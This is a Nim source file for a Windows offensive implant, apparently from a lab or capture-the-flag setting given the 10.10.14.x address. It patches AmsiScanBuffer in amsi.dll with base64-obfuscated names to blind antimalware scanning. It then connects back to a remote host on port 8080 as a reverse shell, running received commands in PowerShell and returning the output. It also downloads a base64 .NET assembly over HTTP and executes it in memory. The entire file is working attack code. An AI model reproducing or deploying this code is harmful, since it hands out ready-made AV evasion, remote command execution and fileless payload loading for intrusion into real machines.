import std/net
import osproc
import winim/clr
import sugar
import strformat
import std/[httpclient,base64]
import dynlib
import strutils
import tinyre
var default = "\e[0;0m"
var red = "\e[0;91"
var green = "\e[0;92m"
var blue = "\e[0;96m"
var yellow = "\e[0;93m"
var SUCCESS = fmt"{green}[+]{default}"
var FAIL = fmt"{red}[-]{default}"
var INFO = fmt"{blue}[o]{default}"
var WARN = fmt"{yellow}[!]{default}"
echo fmt"{SUCCESS} Running!"


proc parse_args(input: string): seq[string] =
  let pattern = reG""""[^"]+"|[^\s]+"""
  for m in match(input, pattern):
    var val = m
    if val.startsWith("\"") and val.endsWith("\""):
      val = val[1..^2]
    result.add(val)

proc get_patch(): seq[byte] =
    echo "[o] PATCHING!"
    var b64_p = ""
    when defined amd64:
        b64_p = "uFdAB4DD"
    elif defined i386:
        b64_p = "uFdAB4DCGAA="


    return cast[seq[byte]](base64.decode(b64_p))

proc patch_amsee(): bool =
    let current_patch = get_patch()
    # Obfuscate the strings
    let dllName = decode("YW1zaS5kbGw=")
    let funcName = decode("QW1zaVNjYW5CdWZmZXI=")
    var
        amsee: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    amsee = loadLib(dllName)
    if isNil(amsee):
        echo "[-] Failed to load dll"
        return disabled

    cs = amsee.symAddr(funcName) # equivalent of GetProcAddress()
    if isNil(cs):
        echo "[-] Failed to get the address"
        return disabled

    if VirtualProtect(cs, current_patch.len, 0x40, addr op):
        echo "[o] Applying patch"
        copyMem(cs, unsafeAddr current_patch[0], current_patch.len)
        VirtualProtect(cs, current_patch.len, op, addr t)
        disabled = true

    return disabled

var ip = "10.10.14.10"
proc execute_assembly(commandArgs: seq[string]) =
    let client = newHttpClient()
    defer: client.close()
    var patched = patch_amsee()
    let url = fmt"http://{ip}/error.log"
    echo "[o] Downloading Base64 payload..."
    let b64Data = client.getContent(url)
    let decodedString = decode(b64Data)
    let buffer = cast[seq[byte]](decodedString)
    # echo fmt"[*] AMSI disabled: {bool(patched)}"
    # echo fmt"{INFO} Versions:"
    for v in clrVersions():
        echo fmt" \==={$v}"
        echo "\n"
        echo ""
        var assembly = load(buffer)
        dump assembly
        var arr = toCLRVariant([""], VT_BSTR) # Passing no argument
        assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
        # var clrArgs = toCLRVariant(r"start C:\Windows\Temp\reader.exe", VT_BSTR)
        var clrArgs = toCLRVariant(commandArgs, VT_BSTR)
        assembly.EntryPoint.Invoke(nil, toCLRVariant([clrArgs]))
        # echo "{INFO} Should've executed!"


let socket = newSocket()
socket.connect(fmt"{ip}", Port(8080))
while true:
    let command = socket.recvLine()
    if command.startsWith("!privesc"):
        let args = parse_args(command[9..^1]) # Skip "!privesc "
        execute_assembly(args)
        continue
    elif command == "!exit":
        break
    else:
        let (output, status) = execCmdEx("powershell -c "&command)
        socket.send(output)
